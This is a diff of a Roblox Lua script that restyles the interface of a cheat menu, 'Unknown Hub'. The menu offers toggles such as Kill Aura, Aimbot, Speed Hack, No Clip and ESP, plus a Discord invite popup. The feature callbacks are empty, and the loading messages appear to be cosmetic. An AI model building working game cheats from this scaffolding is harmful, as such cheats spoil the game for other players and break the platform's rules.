+    if drag and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+        local d = inp.Position - dragS
+        hubMain.Position = UDim2.new(dragP.X.Scale, dragP.X.Offset + d.X, dragP.Y.Scale, dragP.Y.Offset + d.Y)
     end
 end)
 
-local dragging = false
-local dragStart, startPos
-
-hubTop.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = hubMain.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        hubMain.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- ═══════════════════════════════════════════════════════════════
--- UI ELEMENT FUNCTIONS
--- ═══════════════════════════════════════════════════════════════
-
-local function CreateLabel(text, order)
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -8, 0, 20)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = text
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 12
-    lbl.TextColor3 = COLOR_TEXT_MUTED
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.LayoutOrder = order or 0
-    lbl.Parent = contentScroll
-    return lbl
+-- ═══════════════════════════════════════════════════════════
+-- UI ELEMENT CREATORS
+-- ═══════════════════════════════════════════════════════════
+local function mkLabel(txt, ord)
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(1, -8, 0, 20)
+    l.BackgroundTransparency = 1
+    l.Text = txt
+    l.Font = Enum.Font.GothamBold
+    l.TextSize = 12
+    l.TextColor3 = C_MUTED
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.LayoutOrder = ord or 0
+    l.Parent = hubScroll
+    return l
 end
 
-local function CreateSeparator(order)
-    local sep = Instance.new("Frame")
-    sep.Size = UDim2.new(1, -16, 0, 1)
-    sep.BackgroundColor3 = COLOR_SURFACE
-    sep.BackgroundTransparency = 0.5
-    sep.BorderSizePixel = 0
-    sep.LayoutOrder = order or 0
-    sep.Parent = contentScroll
-    return sep
+local function mkSep(ord)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1, -16, 0, 1)
+    f.BackgroundColor3 = C_SURF
+    f.BackgroundTransparency = 0.5
+    f.BorderSizePixel = 0
+    f.LayoutOrder = ord or 0
+    f.Parent = hubScroll
+    return f
 end
 
-local function CreateToggle(name, default, callback, order)
-    local isOn = default or false
-    local container = Instance.new("Frame")
-    container.Size = UDim2.new(1, -8, 0, 40)
-    container.BackgroundColor3 = COLOR_SURFACE_DARK
-    container.BackgroundTransparency = 0.3
-    container.BorderSizePixel = 0
-    container.LayoutOrder = order or 0
-    container.Parent = contentScroll
-    local containerCorner = Instance.new("UICorner")
-    containerCorner.CornerRadius = UDim.new(0, 10)
-    containerCorner.Parent = container
+local function mkToggle(name, def, cb, ord)
+    local on = def or false
+    local c = Instance.new("Frame")
+    c.Size = UDim2.new(1, -8, 0, 38)
+    c.BackgroundColor3 = C_SURFD
+    c.BackgroundTransparency = 0.3
+    c.BorderSizePixel = 0
+    c.LayoutOrder = ord or 0
+    c.Parent = hubScroll
+    mkCorner(c, 10)
 
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, -50, 1, 0)
-    label.Position = UDim2.new(0, 12, 0, 0)
-    label.BackgroundTransparency = 1
-    label.Text = name
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 13
-    label.TextColor3 = COLOR_TEXT
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.TextTruncate = Enum.TextTruncate.AtEnd
-    label.Parent = container
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(1, -50, 1, 0)
+    l.Position = UDim2.new(0, 12, 0, 0)
+    l.BackgroundTransparency = 1
+    l.Text = name
+    l.Font = Enum.Font.GothamBold
+    l.TextSize = 12
+    l.TextColor3 = C_TEXT
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextTruncate = Enum.TextTruncate.AtEnd
+    l.Parent = c
 
-    local toggleBg = Instance.new("Frame")
-    toggleBg.Size = UDim2.fromOffset(38, 20)
-    toggleBg.Position = UDim2.new(1, -46, 0.5, -10)
-    toggleBg.BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF
-    toggleBg.BorderSizePixel = 0
-    toggleBg.Parent = container
-    local toggleBgCorner = Instance.new("UICorner")
-    toggleBgCorner.CornerRadius = UDim.new(0, 10)
-    toggleBgCorner.Parent = toggleBg
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(0, 36, 0, 18)
+    bg.Position = UDim2.new(1, -44, 0.5, -9)
+    bg.BackgroundColor3 = on and C_TEAL or C_TOFF
+    bg.BorderSizePixel = 0
+    bg.Parent = c
+    mkCorner(bg, 9)
 
-    local toggleCircle = Instance.new("Frame")
-    toggleCircle.Size = UDim2.fromOffset(14, 14)
-    toggleCircle.Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
-    toggleCircle.BackgroundColor3 = COLOR_TEXT
-    toggleCircle.BorderSizePixel = 0
-    toggleCircle.Parent = toggleBg
-    local toggleCircleCorner = Instance.new("UICorner")
-    toggleCircleCorner.CornerRadius = UDim.new(0, 7)
-    toggleCircleCorner.Parent = toggleCircle
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, 12, 0, 12)
+    dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
+    dot.BackgroundColor3 = C_TEXT
+    dot.BorderSizePixel = 0
+    dot.Parent = bg
+    mkCorner(dot, 6)
 
-    container.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            isOn = not isOn
-            TweenService:Create(toggleBg, TweenInfo.new(0.2), {BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF}):Play()
-            TweenService:Create(toggleCircle, TweenInfo.new(0.2), {Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)}):Play()
-            if callback then pcall(callback, isOn) end
+    c.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            on = not on
+            bg.BackgroundColor3 = on and C_TEAL or C_TOFF
+            dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
+            if cb then pcall(cb, on) end
         end
     end)
-
-    container.MouseEnter:Connect(function()
-        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.1}):Play()
-    end)
-    container.MouseLeave:Connect(function()
-        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play()
-    end)
-    return container
+    return c
 end
 
-local function CreateButton(name, callback, order)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -8, 0, 36)
-    btn.BackgroundColor3 = COLOR_SURFACE_DARK
-    btn.BackgroundTransparency = 0.2
-    btn.BorderSizePixel = 0
-    btn.Text = name
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 13
-    btn.TextColor3 = COLOR_TEXT
-    btn.AutoButtonColor = false
-    btn.LayoutOrder = order or 0
-    btn.Parent = contentScroll
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 10)
-    btnCorner.Parent = btn
+local function mkBtn(name, cb, ord)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -8, 0, 34)
+    b.BackgroundColor3 = C_SURFD
+    b.BackgroundTransparency = 0.2
+    b.BorderSizePixel = 0
+    b.Text = name
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.TextColor3 = C_TEXT
+    b.AutoButtonColor = false
+    b.LayoutOrder = ord or 0
+    b.Parent = hubScroll
+    mkCorner(b, 10)
+    mkStroke(b, C_STROKE, 1, 0.6)
 
-    local btnStroke = Instance.new("UIStroke")
-    btnStroke.Parent = btn
-    btnStroke.Thickness = 1
-    btnStroke.Transparency = 0.6
-    btnStroke.Color = COLOR_STROKE_MAIN
-
-    btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = COLOR_HOVER, BackgroundTransparency = 0}):Play()
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = COLOR_SURFACE_DARK, BackgroundTransparency = 0.2}):Play()
-    end)
-
-    btn.MouseButton1Click:Connect(function()
-        local originalText = btn.Text
-        btn.Text = "Loading..."
-        btn.TextColor3 = COLOR_TEAL_ON
+    b.MouseButton1Click:Connect(function()
+        b.Text = "Loading..."
+        b.TextColor3 = C_TEAL
         spawn(function()
-            task.wait(0.5)
-            btn.Text = originalText
-            btn.TextColor3 = COLOR_TEXT
-            if callback then pcall(callback) end
+            wait(0.4)
+            b.Text = name
+            b.TextColor3 = C_TEXT
+            if cb then pcall(cb) end
         end)
     end)
-    return btn
+    return b
 end
 
-local function CreateSlider(name, min, max, default, callback, order)
-    local value = default or min
-    local container = Instance.new("Frame")
-    container.Size = UDim2.new(1, -8, 0, 50)
-    container.BackgroundColor3 = COLOR_SURFACE_DARK
-    container.BackgroundTransparency = 0.3
-    container.BorderSizePixel = 0
-    container.LayoutOrder = order or 0
-    container.Parent = contentScroll
-    local containerCorner = Instance.new("UICorner")
-    containerCorner.CornerRadius = UDim.new(0, 10)
-    containerCorner.Parent = container
+local function mkSlider(name, mn, mx, def, cb, ord)
+    local val = def or mn
+    local c = Instance.new("Frame")
+    c.Size = UDim2.new(1, -8, 0, 48)
+    c.BackgroundColor3 = C_SURFD
+    c.BackgroundTransparency = 0.3
+    c.BorderSizePixel = 0
+    c.LayoutOrder = ord or 0
+    c.Parent = hubScroll
+    mkCorner(c, 10)
 
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, -60, 0, 22)
-    label.Position = UDim2.new(0, 12, 0, 6)
-    label.BackgroundTransparency = 1
-    label.Text = name
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 12
-    label.TextColor3 = COLOR_TEXT
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.TextTruncate = Enum.TextTruncate.AtEnd
-    label.Parent = container
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(1, -55, 0, 20)
+    l.Position = UDim2.new(0, 12, 0, 6)
+    l.BackgroundTransparency = 1
+    l.Text = name
+    l.Font = Enum.Font.GothamBold
+    l.TextSize = 11
+    l.TextColor3 = C_TEXT
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextTruncate = Enum.TextTruncate.AtEnd
+    l.Parent = c
 
-    local valueLabel = Instance.new("TextLabel")
-    valueLabel.Size = UDim2.new(0, 50, 0, 22)
-    valueLabel.Position = UDim2.new(1, -58, 0, 6)
-    valueLabel.BackgroundTransparency = 1
-    valueLabel.Text = tostring(math.floor(value))
-    valueLabel.Font = Enum.Font.GothamBold
-    valueLabel.TextSize = 12
-    valueLabel.TextColor3 = COLOR_TEAL_ON
-    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
-    valueLabel.Parent = container
+    local vl = Instance.new("TextLabel")
+    vl.Size = UDim2.new(0, 40, 0, 20)
+    vl.Position = UDim2.new(1, -48, 0, 6)
+    vl.BackgroundTransparency = 1
+    vl.Text = tostring(math.floor(val))
+    vl.Font = Enum.Font.GothamBold
+    vl.TextSize = 11
+    vl.TextColor3 = C_TEAL
+    vl.TextXAlignment = Enum.TextXAlignment.Right
+    vl.Parent = c
 
-    local sliderBg = Instance.new("Frame")
-    sliderBg.Size = UDim2.new(1, -24, 0, 6)
-    sliderBg.Position = UDim2.new(0, 12, 0, 34)
-    sliderBg.BackgroundColor3 = COLOR_TOGGLE_OFF
-    sliderBg.BorderSizePixel = 0
-    sliderBg.Parent = container
-    local sliderBgCorner = Instance.new("UICorner")
-    sliderBgCorner.CornerRadius = UDim.new(0, 3)
-    sliderBgCorner.Parent = sliderBg
+    local sb = Instance.new("Frame")
+    sb.Size = UDim2.new(1, -24, 0, 6)
+    sb.Position = UDim2.new(0, 12, 0, 32)
+    sb.BackgroundColor3 = C_TOFF
+    sb.BorderSizePixel = 0
+    sb.Parent = c
+    mkCorner(sb, 3)
 
-    local percent = (value - min) / (max - min)
-    local sliderFill = Instance.new("Frame")
-    sliderFill.Size = UDim2.fromScale(percent, 1)
-    sliderFill.BackgroundColor3 = COLOR_TEAL_ON
-    sliderFill.BorderSizePixel = 0
-    sliderFill.Parent = sliderBg
-    local sliderFillCorner = Instance.new("UICorner")
-    sliderFillCorner.CornerRadius = UDim.new(0, 3)
-    sliderFillCorner.Parent = sliderFill
+    local pct = (val - mn) / (mx - mn)
+    local sf = Instance.new("Frame")
+    sf.Size = UDim2.new(pct, 0, 1, 0)
+    sf.BackgroundColor3 = C_TEAL
+    sf.BorderSizePixel = 0
+    sf.Parent = sb
+    mkCorner(sf, 3)
 
-    local sliderBtn = Instance.new("Frame")
-    sliderBtn.Size = UDim2.fromOffset(14, 14)
-    sliderBtn.Position = UDim2.fromScale(percent, 0.5)
-    sliderBtn.AnchorPoint = Vector2.new(0.5, 0.5)
-    sliderBtn.BackgroundColor3 = COLOR_TEXT
-    sliderBtn.BorderSizePixel = 0
-    sliderBtn.Parent = sliderBg
-    local sliderBtnCorner = Instance.new("UICorner")
-    sliderBtnCorner.CornerRadius = UDim.new(0, 7)
-    sliderBtnCorner.Parent = sliderBtn
+    local sd = Instance.new("Frame")
+    sd.Size = UDim2.new(0, 12, 0, 12)
+    sd.Position = UDim2.new(pct, 0, 0.5, 0)
+    sd.AnchorPoint = Vector2.new(0.5, 0.5)
+    sd.BackgroundColor3 = C_TEXT
+    sd.BorderSizePixel = 0
+    sd.Parent = sb
+    mkCorner(sd, 6)
 
-    local function updateSlider(newValue)
-        value = math.clamp(newValue, min, max)
-        local newPercent = (value - min) / (max - min)
-        sliderFill.Size = UDim2.fromScale(newPercent, 1)
-        sliderBtn.Position = UDim2.fromScale(newPercent, 0.5)
-        valueLabel.Text = tostring(math.floor(value))
-        if callback then pcall(callback, value) end
+    local function upd(nv)
+        val = math.clamp(nv, mn, mx)
+        local np = (val - mn) / (mx - mn)
+        sf.Size = UDim2.new(np, 0, 1, 0)
+        sd.Position = UDim2.new(np, 0, 0.5, 0)
+        vl.Text = tostring(math.floor(val))
+        if cb then pcall(cb, val) end
     end
 
-    local isDragging = false
-    sliderBtn.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = true end
-    end)
-    sliderBg.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            isDragging = true
-            local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
-            updateSlider(min + relPos * (max - min))
+    local isDrag = false
+    sd.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = true end end)
+    sb.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            isDrag = true
+            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
         end
     end)
-    UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = false end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
-            updateSlider(min + relPos * (max - min))
+    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = false end end)
+    UserInputService.InputChanged:Connect(function(i)
+        if isDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
         end
     end)
-    return container
+    return c
 end
 
--- ═══════════════════════════════════════════════════════════════
--- ADD FEATURES
--- ═══════════════════════════════════════════════════════════════
-local orderCounter = 0
+-- ═══════════════════════════════════════════════════════════
+-- ADD ALL FEATURES
+-- ═══════════════════════════════════════════════════════════
+local o = 0
+mkLabel("COMBAT", o) o=o+1
+mkToggle("Melee Aimbot", false, nil, o) o=o+1
+mkToggle("Auto Steal Nearest", false, nil, o) o=o+1
+mkToggle("Kill Aura", false, nil, o) o=o+1
+mkSep(o) o=o+1
+mkLabel("FARM", o) o=o+1
+mkToggle("Auto Farm", false, nil, o) o=o+1
+mkToggle("Auto Collect", false, nil, o) o=o+1
+mkToggle("Cash Multiplier", false, nil, o) o=o+1
+mkSlider("Multi Value", 1, 100, 2, nil, o) o=o+1
+mkBtn("Teleport to Collect Zone", nil, o) o=o+1
+mkSep(o) o=o+1
+mkLabel("SHOP", o) o=o+1
+mkBtn("Buy All Upgrades", nil, o) o=o+1
+mkBtn("Unlock All Weapons", nil, o) o=o+1
+mkToggle("Auto Buy Best", false, nil, o) o=o+1
+mkSep(o) o=o+1
+mkLabel("MOVEMENT", o) o=o+1
+mkToggle("Speed Hack", false, nil, o) o=o+1
+mkSlider("Speed Value", 16, 500, 100, nil, o) o=o+1
+mkToggle("Infinite Jump", false, nil, o) o=o+1
+mkToggle("No Clip", false, nil, o) o=o+1
+mkSep(o) o=o+1
+mkLabel("VISUALS", o) o=o+1
+mkToggle("ESP Players", false, nil, o) o=o+1
+mkToggle("ESP Items", false, nil, o) o=o+1
+mkSlider("ESP Distance", 50, 5000, 500, nil, o) o=o+1
+mkToggle("Full Bright", false, nil, o) o=o+1
+mkSep(o) o=o+1
+mkLabel("MISC", o) o=o+1
+mkBtn("Anti-AFK", nil, o) o=o+1
+mkBtn("Server Hop", nil, o) o=o+1
+mkBtn("Rejoin Server", nil, o) o=o+1
+mkLabel("Keybind: RightShift", o)
 
-CreateLabel("⚔️ COMBAT", orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Melee Aimbot", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Auto Steal Nearest", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Kill Aura", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-
-CreateSeparator(orderCounter); orderCounter = orderCounter + 1
-CreateLabel("💰 FARM", orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Auto Farm", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Auto Collect", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Cash Multiplier", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateSlider("Multi Value", 1, 100, 2, function(val) end, orderCounter); orderCounter = orderCounter + 1
-CreateButton("Teleport to Collect Zone", function() end, orderCounter); orderCounter = orderCounter + 1
-
-CreateSeparator(orderCounter); orderCounter = orderCounter + 1
-CreateLabel("🛒 SHOP", orderCounter); orderCounter = orderCounter + 1
-CreateButton("Buy All Upgrades", function() end, orderCounter); orderCounter = orderCounter + 1
-CreateButton("Unlock All Weapons", function() end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Auto Buy Best", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-
-CreateSeparator(orderCounter); orderCounter = orderCounter + 1
-CreateLabel("🏃 MOVEMENT", orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Speed Hack", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateSlider("Speed Value", 16, 500, 100, function(val) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Infinite Jump", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("No Clip", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-
-CreateSeparator(orderCounter); orderCounter = orderCounter + 1
-CreateLabel("👁️ VISUALS", orderCounter); orderCounter = orderCounter + 1
-CreateToggle("ESP Players", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("ESP Items", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-CreateSlider("ESP Distance", 50, 5000, 500, function(val) end, orderCounter); orderCounter = orderCounter + 1
-CreateToggle("Full Bright", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
-
-CreateSeparator(orderCounter); orderCounter = orderCounter + 1
-CreateLabel("⚙️ MISC", orderCounter); orderCounter = orderCounter + 1
-CreateButton("Anti-AFK", function() end, orderCounter); orderCounter = orderCounter + 1
-CreateButton("Server Hop", function() end, orderCounter); orderCounter = orderCounter + 1
-CreateButton("Rejoin Server", function() end, orderCounter); orderCounter = orderCounter + 1
-CreateLabel("Keybind: RightShift", orderCounter)
-
--- ═══════════════════════════════════════════════════════════════
--- DISCORD POPUP
--- ═══════════════════════════════════════════════════════════════
-local function ShowDiscordPopup()
+-- ═══════════════════════════════════════════════════════════
+-- DISCORD POPUP FUNCTION
+-- ═══════════════════════════════════════════════════════════
+local function showDiscord()
     if config.__UnknownHubDiscordShown == true then return end
-    local popupGui = Instance.new("ScreenGui")
-    popupGui.Name = "UnknownHubDiscord"
-    popupGui.IgnoreGuiInset = true
-    popupGui.ResetOnSpawn = false
-    popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    popupGui.Parent = playerGui
+    
+    local dg = Instance.new("ScreenGui")
+    dg.Name = "UHDiscord"
+    dg.IgnoreGuiInset = true
+    dg.ResetOnSpawn = false
+    dg.Parent = playerGui
 
-    local popupOverlay = Instance.new("Frame")
-    popupOverlay.Size = UDim2.fromScale(1, 1)
-    popupOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    popupOverlay.BackgroundTransparency = 0.5
-    popupOverlay.BorderSizePixel = 0
-    popupOverlay.Parent = popupGui
+    local dov = Instance.new("Frame")
+    dov.Size = UDim2.new(1, 0, 1, 0)
+    dov.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    dov.BackgroundTransparency = 0.5
+    dov.BorderSizePixel = 0
+    dov.Parent = dg
 
-    local card = _makeCard(popupGui, UDim2.fromOffset(380, 228))
-    card.AnchorPoint = Vector2.new(0.5, 0.5)
-    card.Position = UDim2.new(0.5, 0, 0.34, 0)
-    local top = _makeTopBar(card, "Unknown Hub Discord")
+    local cd = mkCard(dg, UDim2.new(0, 380, 0, 228))
+    cd.Position = UDim2.new(0.5, -190, 0.5, -114)
+    local ct = mkTopBar(cd, "Unknown Hub Discord")
 
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Parent = top
-    closeBtn.BackgroundColor3 = COLOR_SURFACE
-    closeBtn.AutoButtonColor = true
-    closeBtn.BorderSizePixel = 0
-    closeBtn.Text = "X"
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 14
-    closeBtn.TextColor3 = COLOR_TEXT
-    closeBtn.Size = UDim2.fromOffset(28, 28)
-    closeBtn.Position = UDim2.new(1, -34, 0.5, -14)
-    local closeBtnCorner = Instance.new("UICorner")
-    closeBtnCorner.CornerRadius = UDim.new(0, 8)
-    closeBtnCorner.Parent = closeBtn
-    local closeStroke = Instance.new("UIStroke")
-    closeStroke.Parent = closeBtn
-    closeStroke.Thickness = 1
-    closeStroke.Transparency = 0.25
-    closeStroke.Color = COLOR_STROKE_MAIN
+    local cb = Instance.new("TextButton")
+    cb.Size = UDim2.new(0, 28, 0, 28)
+    cb.Position = UDim2.new(1, -34, 0.5, -14)
+    cb.BackgroundColor3 = C_SURF
+    cb.Text = "X"
+    cb.Font = Enum.Font.GothamBold
+    cb.TextSize = 14
+    cb.TextColor3 = C_TEXT
+    cb.BorderSizePixel = 0
+    cb.AutoButtonColor = true
+    cb.Parent = ct
+    mkCorner(cb, 8)
 
-    local body = Instance.new("TextLabel")
-    body.Parent = card
-    body.BackgroundTransparency = 1
-    body.Position = UDim2.new(0, 18, 0, 60)
-    body.Size = UDim2.new(1, -36, 0, 76)
-    body.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
-    body.TextWrapped = true
-    body.Font = Enum.Font.Gotham
-    body.TextSize = 16
-    body.TextXAlignment = Enum.TextXAlignment.Center
-    body.TextYAlignment = Enum.TextYAlignment.Center
-    body.TextColor3 = COLOR_TEXT
+    local bd = Instance.new("TextLabel")
+    bd.Size = UDim2.new(1, -36, 0, 76)
+    bd.Position = UDim2.new(0, 18, 0, 60)
+    bd.BackgroundTransparency = 1
+    bd.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
+    bd.TextWrapped = true
+    bd.Font = Enum.Font.Gotham
+    bd.TextSize = 16
+    bd.TextXAlignment = Enum.TextXAlignment.Center
+    bd.TextYAlignment = Enum.TextYAlignment.Center
+    bd.TextColor3 = C_TEXT
+    bd.Parent = cd
 
-    local copyBtn = Instance.new("TextButton")
-    copyBtn.Parent = card
-    copyBtn.Size = UDim2.new(1, -24, 0, 38)
-    copyBtn.Position = UDim2.new(0, 12, 1, -70)
-    copyBtn.BackgroundColor3 = COLOR_TEAL_ON
-    copyBtn.BorderSizePixel = 0
-    copyBtn.Text = "Copy Discord Invite"
-    copyBtn.Font = Enum.Font.GothamBlack
-    copyBtn.TextSize = 16
-    copyBtn.TextColor3 = Color3.fromRGB(14, 25, 38)
-    local copyBtnCorner = Instance.new("UICorner")
-    copyBtnCorner.CornerRadius = UDim.new(0, 12)
-    copyBtnCorner.Parent = copyBtn
-    local cpStroke = Instance.new("UIStroke")
-    cpStroke.Parent = copyBtn
-    cpStroke.Thickness = 1
-    cpStroke.Transparency = 0.15
-    cpStroke.Color = COLOR_STROKE_MAIN
+    local cpb = Instance.new("TextButton")
+    cpb.Size = UDim2.new(1, -24, 0, 38)
+    cpb.Position = UDim2.new(0, 12, 1, -70)
+    cpb.BackgroundColor3 = C_TEAL
+    cpb.Text = "Copy Discord Invite"
+    cpb.Font = Enum.Font.GothamBlack
+    cpb.TextSize = 16
+    cpb.TextColor3 = Color3.fromRGB(14, 25, 38)
+    cpb.BorderSizePixel = 0
+    cpb.Parent = cd
+    mkCorner(cpb, 12)
 
-    local toast = Instance.new("TextLabel")
-    toast.Parent = card
-    toast.BackgroundTransparency = 1
-    toast.Position = UDim2.new(0, 12, 1, -48)
-    toast.Size = UDim2.new(1, -24, 0, 16)
-    toast.Text = ""
-    toast.Font = Enum.Font.Gotham
-    toast.TextSize = 12
-    toast.TextXAlignment = Enum.TextXAlignment.Center
-    toast.TextColor3 = COLOR_TEXT_MUTED
+    local tt = Instance.new("TextLabel")
+    tt.Size = UDim2.new(1, -24, 0, 16)
+    tt.Position = UDim2.new(0, 12, 1, -48)
+    tt.BackgroundTransparency = 1
+    tt.Text = ""
+    tt.Font = Enum.Font.Gotham
+    tt.TextSize = 12
+    tt.TextColor3 = C_MUTED
+    tt.TextXAlignment = Enum.TextXAlignment.Center
+    tt.Parent = cd
 
-    local function copyToClipboard(text)
-        if type(text) ~= "string" then return false end
-        if setclipboard and type(setclipboard) == "function" then if pcall(setclipboard, text) then return true end end
-        if toclipboard and type(toclipboard) == "function" then if pcall(toclipboard, text) then return true end end
-        if syn and type(syn) == "table" and type(syn.write_clipboard) == "function" then if pcall(syn.write_clipboard, text) then return true end end
-        return false
-    end
-
-    copyBtn.MouseButton1Click:Connect(function()
-        if copyToClipboard(DISCORD_LINK) then
-            toast.Text = "Invite link copied to clipboard."
-        else
-            toast.Text = "Clipboard not supported. Link: "..DISCORD_LINK
-        end
+    cpb.MouseButton1Click:Connect(function()
+        if clip(DISCORD_LINK) then tt.Text = "Copied!"
+        else tt.Text = "Link: "..DISCORD_LINK end
     end)
 
-    local function closePopup()
+    local function closeD()
         config.__UnknownHubDiscordShown = true
-        saveConfigHard()
-        popupGui:Destroy()
+        saveCfg()
+        dg:Destroy()
     end
-
-    closeBtn.MouseButton1Click:Connect(closePopup)
-    popupOverlay.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then closePopup() end
+    cb.MouseButton1Click:Connect(closeD)
+    dov.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then closeD() end
     end)
-
-    card.Size = UDim2.fromOffset(0, 0)
-    TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(380, 228)}):Play()
 end
 
--- ═══════════════════════════════════════════════════════════════
--- LOADING SEQUENCE -> DISCORD -> SHOW HUB
--- ═══════════════════════════════════════════════════════════════
-spawn(function()
-    local steps = {
-        {p = 0.1, s = "Checking executor...", sub = "Verifying compatibility"},
-        {p = 0.25, s = "Loading configuration...", sub = "Reading saved settings"},
-        {p = 0.4, s = "Initializing modules...", sub = "Loading core systems"},
-        {p = 0.55, s = "Loading UI components...", sub = "Building interface"},
-        {p = 0.7, s = "Setting up features...", sub = "Preparing toggles & sliders"},
-        {p = 0.85, s = "Checking for updates...", sub = "Contacting server"},
